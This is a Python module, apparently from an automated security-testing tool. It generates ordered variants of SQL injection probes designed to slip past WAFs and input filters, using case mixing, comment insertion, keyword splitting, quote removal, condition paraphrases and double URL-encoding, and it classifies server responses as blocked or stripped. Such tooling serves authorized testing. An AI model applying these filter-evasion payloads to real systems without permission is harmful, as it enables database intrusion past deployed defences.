#!/usr/bin/env python3
"""SGK-2026-0453: pure-function transformation catalog + interference
classification + selection-strategy seam (Ver.1 = deterministic).

Approved phase-0 design contract (plan §D/§G):
- Product-independent by construction: operates ONLY on standard SQL lexemes
  (SELECT / UNION / ORDER BY / OR / AND), standard SQL comments (-- / # / /* */)
  and generic percent-encoding. No product names, URLs or block-page strings.
- Deterministic: pure functions, no RNG, no wall-clock — the same
  (canonical, db_type) input always yields the same ordered sequence.
- stdlib only (no imports from src/).
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Dict, FrozenSet, List, Optional, Protocol, Sequence, Tuple
from urllib.parse import quote

# Generic block signatures (WAF / app-level rejections) — HTTP status codes
# only, never product-specific block-page strings.
BLOCK_STATUSES: Tuple[int, ...] = (403, 406, 412, 429)

# Hard send budget for the boolean-oracle extraction fallback (plan §E):
# worst case 172 probes by construction; the cap aborts fail-closed.
ORACLE_EXTRACTION_PROBE_CAP = 200

# Standard SQL keywords the catalog may rewrite. "ORDER BY" precedes "OR" so
# the two-word token is consumed first (count=1 replacements).
_MIXED_CASE_TOKENS: Tuple[Tuple[str, str], ...] = (
    ("SELECT", "SeLeCt"),
    ("UNION", "UnIoN"),
    ("ORDER BY", "oRdEr By"),
    ("OR", "oR"),
    ("AND", "aNd"),
)

# Per-DB comment terminator variants. "--" is the identity (skipped here);
# "#" is MySQL/MariaDB only; "/* */" is valid everywhere (self-contained
# block comment — with a harness query that has no trailing template it is a
# safe no-op). Unknown DB falls back to the generic "--" + "/* */" set.
_TERMINATOR_BY_DB: Dict[str, Tuple[str, ...]] = {
    "mysql": ("#", "/* */"),
    "mariadb": ("#", "/* */"),
    "mssql": ("/* */",),
    "postgresql": ("/* */",),
    "postgres": ("/* */",),
    "sqlite": ("/* */",),
    "": ("/* */",),
}


# ---------------------------------------------------------------------------
# catalog data structures
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class TransformStep:
    """One catalog candidate. ``canonical`` is the untransformed probe string
    (identity rendering); ``rendered`` is the payload to send; ``pre_encoded``
    marks ENCODING steps whose payload must skip one urlencode layer."""

    kind: str
    variant: int
    canonical: str
    rendered: str
    pre_encoded: bool = False

    @property
    def key(self) -> Tuple[str, int]:
        return (self.kind, self.variant)


@dataclass(frozen=True)
class ProbeObservation:
    """One observed probe (the observation history fed to the strategy)."""

    step: TransformStep
    probe: str
    result: str
    differential: bool


@dataclass(frozen=True)
class ReconInfo:
    """Recon facts available to the selection strategy (Ver.1: db_type only)."""

    db_type: str = "unknown"


@dataclass(frozen=True)
class InterferenceVerdict:
    """Result of classify_interference(). ``verdict`` is one of
    "blocked" | "stripped_suspected" | "no_interference" (fail-closed)."""

    verdict: str
    reason: str = ""
    signals: Dict[str, object] = field(default_factory=dict)


# ---------------------------------------------------------------------------
# selection strategy seam (plan §G — Ver.2 swaps the implementation only)
# ---------------------------------------------------------------------------


class TransformSelectionStrategy(Protocol):
    """Given the ordered candidates, the observation history, recon and the
    already-rejected step keys, returns the next candidate (or None when
    exhausted). Ver.1 = deterministic fixed order."""

    def next_candidate(
        self,
        *,
        candidates: Sequence[TransformStep],
        observations: Sequence[ProbeObservation],
        recon: ReconInfo,
        rejected: FrozenSet[Tuple[str, int]],
    ) -> Optional[TransformStep]:
        ...


class DeterministicFixedOrderStrategy:
    """Ver.1 selection strategy: candidates in catalog order, skipping keys
    already recorded as rejected (plan §G). Ver.2 replaces this class with an
    AI-driven implementation behind the same Protocol."""

    def next_candidate(
        self,
        *,
        candidates: Sequence[TransformStep],
        observations: Sequence[ProbeObservation],
        recon: ReconInfo,
        rejected: FrozenSet[Tuple[str, int]],
    ) -> Optional[TransformStep]:
        for cand in candidates:
            if cand.key in rejected:
                continue
            return cand
        return None


# ---------------------------------------------------------------------------
# transform renderers (pure; each returns (kind, rendered, pre_encoded))
# ---------------------------------------------------------------------------


def _double_encode(value: str) -> str:
    """Generic double percent-encoding (works against defenses that only scan
    one decode layer; requires a two-layer decode to be effective)."""
    once = quote(str(value), safe="")
    return quote(once, safe="")


def _encode_value_with_placeholder(value: str) -> str:
    """Double percent-encode a value, protecting the "<N>" placeholder (the
    ORDER BY column-discovery substitutes it AFTER rendering)."""
    parts = str(value).split("<N>")
    return "<N>".join(_double_encode(part) for part in parts)


def _terminator_variants(canonical: str, db: str) -> List[Tuple[str, str, bool]]:
    if not canonical.endswith("--"):
        return []
    out: List[Tuple[str, str, bool]] = []
    for term in _TERMINATOR_BY_DB.get(db, _TERMINATOR_BY_DB[""]):
        if term == "--":
            continue  # identity
        out.append(("terminator", canonical[:-2] + term, False))
    return out


def _case_mix_variants(canonical: str) -> List[Tuple[str, str, bool]]:
    out: List[Tuple[str, str, bool]] = []
    for token, mixed in _MIXED_CASE_TOKENS:
        pattern = r"\b" + re.escape(token) + r"\b"
        if re.search(pattern, canonical, re.IGNORECASE):
            rendered = re.sub(
                pattern, mixed, canonical, count=1, flags=re.IGNORECASE
            )
            if rendered != canonical:
                out.append(("case_mix", rendered, False))
    return out


def _ws_comment_variants(canonical: str) -> List[Tuple[str, str, bool]]:
    out: List[Tuple[str, str, bool]] = []
    replaced = 0
    for i, ch in enumerate(canonical):
        if ch == " ":
            out.append(
                ("ws_comment", canonical[:i] + "/**/" + canonical[i + 1 :], False)
            )
            replaced += 1
            if replaced >= 3:
                break
    return out


def _comment_split_variants(canonical: str, db: str) -> List[Tuple[str, str, bool]]:
    """Keyword split with a comment (UN/**/ION) — MySQL/MariaDB only."""
    if db not in ("mysql", "mariadb"):
        return []
    out: List[Tuple[str, str, bool]] = []
    for token in ("SELECT", "UNION", "OR", "AND"):
        match = re.search(r"\b" + re.escape(token) + r"\b", canonical, re.IGNORECASE)
        if not match:
            continue
        split = match.start() + (match.end() - match.start() + 1) // 2
        rendered = canonical[:split] + "/**/" + canonical[split:]
        if rendered != canonical:
            out.append(("comment_split", rendered, False))
    return out


def _no_quote_variants(canonical: str) -> List[Tuple[str, str, bool]]:
    """Quote-free (numeric) shape — the primary answer to quote-stripping
    defenses; only meaningful when a boolean condition keyword is present."""
    if "'" not in canonical:
        return []
    if not re.search(r"\b(?:OR|AND)\b", canonical, re.IGNORECASE):
        return []
    rendered = canonical.replace("'", "")
    if rendered != canonical:
        return [("no_quote", rendered, False)]
    return []


def _cond_paraphrase_variants(canonical: str) -> List[Tuple[str, str, bool]]:
    out: List[Tuple[str, str, bool]] = []
    for src, dst in (("1=1", "'a'='a'"), ("1=2", "'a'='b'")):
        if src in canonical:
            rendered = canonical.replace(src, dst, 1)
            if rendered != canonical:
                out.append(("cond_paraphrase", rendered, False))
    return out


def _encoding_variants(canonical: str) -> List[Tuple[str, str, bool]]:
    """Double percent-encoding of the VALUE part (the "param=" name is left
    intact; the "<N>" placeholder is protected) — tried LAST (only useful
    behind two decode layers, highest chance of breaking the app)."""
    # Only a leading "param=" prefix is split out (a param name has no spaces).
    # A value-only canonical like "1' OR 1=1 --" must be encoded in full.
    match = re.match(r"^[A-Za-z0-9_.\-]+=", canonical)
    if match:
        name = match.group(0)[:-1]
        value = canonical[len(name) + 1 :]
        rendered = name + "=" + _encode_value_with_placeholder(value)
    else:
        rendered = _encode_value_with_placeholder(canonical)
    if rendered != canonical:
        return [("encoding", rendered, True)]
    return []


# ---------------------------------------------------------------------------
# public catalog API
# ---------------------------------------------------------------------------


def catalog_sequence(canonical: str, db_type: str = "") -> List[TransformStep]:
    """Finite, deterministic, ordered transform sequence for one canonical
    probe. The identity step always comes first; the tier order is fixed
    (TERMINATOR -> CASE_MIX -> WS_COMMENT -> COMMENT_SPLIT -> NO_QUOTE ->
    COND_PARAPHRASE -> ENCODING). Same input -> same sequence."""
    db = str(db_type or "").strip().lower()
    steps: List[TransformStep] = [TransformStep("identity", 1, canonical, canonical, False)]
    variant_counters: Dict[str, int] = {}

    def add(kind: str, rendered: str, pre_encoded: bool = False) -> None:
        number = variant_counters.get(kind, 1)
        steps.append(TransformStep(kind, number, canonical, rendered, pre_encoded))
        variant_counters[kind] = number + 1

    for kind, rendered, pre in _terminator_variants(canonical, db):
        add(kind, rendered, pre)
    for kind, rendered, pre in _case_mix_variants(canonical):
        add(kind, rendered, pre)
    for kind, rendered, pre in _ws_comment_variants(canonical):
        add(kind, rendered, pre)
    for kind, rendered, pre in _comment_split_variants(canonical, db):
        add(kind, rendered, pre)
    for kind, rendered, pre in _no_quote_variants(canonical):
        add(kind, rendered, pre)
    for kind, rendered, pre in _cond_paraphrase_variants(canonical):
        add(kind, rendered, pre)
    for kind, rendered, pre in _encoding_variants(canonical):
        add(kind, rendered, pre)
    return steps


# ---------------------------------------------------------------------------
# interference classification (plan §C)
# ---------------------------------------------------------------------------


def _is_reflected(payload: str, obs: Dict[str, Any]) -> bool:
    """Whether the sent payload appears in the observed response (reflection
    check). Operates on the observation fields only (F-7): poc_response (up to
    500 chars) preferred, body_snippet fallback. Absence is never taken as a
    positive signal (truncation-safe).

    Fragments shorter than 3 chars are skipped: single-key-character values
    like ``1'`` / ``1"`` match JSON/HTML syntax quotes in any response and
    would be a false positive (a stripped probe must still look stripped).
    Missing a genuine short reflection only degrades to "stripped" (the
    catalog then tries harmlessly — fail-closed)."""
    if not payload:
        return False
    body = str(obs.get("poc_response", "") or "") or str(obs.get("body_snippet", "") or "")
    if not body:
        return False
    candidates = [payload]
    if "=" in payload:
        candidates.append(payload.split("=", 1)[1])
    return any(
        cand and len(cand) >= 3 and cand in body for cand in candidates
    )


def classify_interference(
    baseline_obs: Dict[str, Any],
    probes: Sequence[Tuple[str, Dict[str, Any]]],
) -> InterferenceVerdict:
    """Generic interference classification from observation dicts only.

    Signals (plan §C):
    - S1 baseline diff: probe (status, body_snippet) vs the plain-value baseline.
    - S2 key-char reflection: the sent payload appearing in the response
      (input reached the app verbatim -> inert, not stripped).
    - S3 generic block signature: HTTP status in BLOCK_STATUSES, or several
      distinct probes answered with one identical (status, body) that differs
      from the baseline (a uniform block page).

    Verdict (deterministic):
    - S3 -> "blocked"
    - all probes identical to the baseline AND no reflection -> "stripped_suspected"
    - anything else (differential observed / reflected) -> "no_interference"

    Fail-closed: missing/insufficient observations or contradictions always
    resolve to "no_interference" (the legacy path; no evasion attempted)."""
    if not probes or not isinstance(baseline_obs, dict):
        return InterferenceVerdict("no_interference", "insufficient_observations")
    if "status" not in baseline_obs:
        return InterferenceVerdict("no_interference", "insufficient_observations")
    for _payload, obs in probes:
        if not isinstance(obs, dict) or "status" not in obs:
            return InterferenceVerdict("no_interference", "insufficient_observations")
    bl_status = int(baseline_obs.get("status", 0) or 0)
    bl_body = str(baseline_obs.get("body_snippet", "") or "")
    statuses: List[int] = []
    bodies: List[str] = []
    reflected: List[bool] = []
    for payload, obs in probes:
        if not isinstance(obs, dict):
            return InterferenceVerdict("no_interference", "insufficient_observations")
        statuses.append(int(obs.get("status", 0) or 0))
        bodies.append(str(obs.get("body_snippet", "") or ""))
        reflected.append(_is_reflected(str(payload or ""), obs))

    # S3: generic block signatures
    if any(st in BLOCK_STATUSES for st in statuses):
        return InterferenceVerdict("blocked", "block_status_code", {"statuses": statuses})
    if (
        len(set(zip(statuses, bodies))) == 1
        and (statuses[0], bodies[0]) != (bl_status, bl_body)
    ):
        return InterferenceVerdict(
            "blocked",
            "uniform_block_page",
            {"identical_probes": True, "baseline_different": True},
        )

    # S1 + S2: identical to baseline without reflection -> stripped
    if all(st == bl_status and bd == bl_body for st, bd in zip(statuses, bodies)):
        if not any(reflected):
            return InterferenceVerdict(
                "stripped_suspected",
                "identical_to_baseline_no_reflection",
                {"identical_to_baseline": True, "reflected": False},
            )
        return InterferenceVerdict("no_interference", "payload_reflected")

    return InterferenceVerdict("no_interference", "differential_observed")
